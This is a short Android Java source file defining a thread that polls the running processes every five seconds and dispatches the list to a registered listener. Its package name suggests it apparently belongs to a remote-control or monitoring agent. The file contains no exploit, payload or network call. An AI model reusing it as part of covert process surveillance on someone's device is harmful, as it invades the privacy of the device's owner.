package com.ht.RCSAndroidGUI.listener;

import java.util.ArrayList;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.ht.RCSAndroidGUI.RunningProcesses;

public class BroadcastMonitorProcess extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess";

	private boolean stop;
	private int period;
	RunningProcesses runningProcess;

	private ListenerProcess listenerProcess;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 5000; // Poll interval
		runningProcess = new RunningProcesses();
	}

	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			runningProcess.update();
			listenerProcess.dispatch(runningProcess);

			try {
				wait(period);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} while (true);
	}

	void register(ListenerProcess listenerProcess) {
		stop = false;
		this.listenerProcess=listenerProcess;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}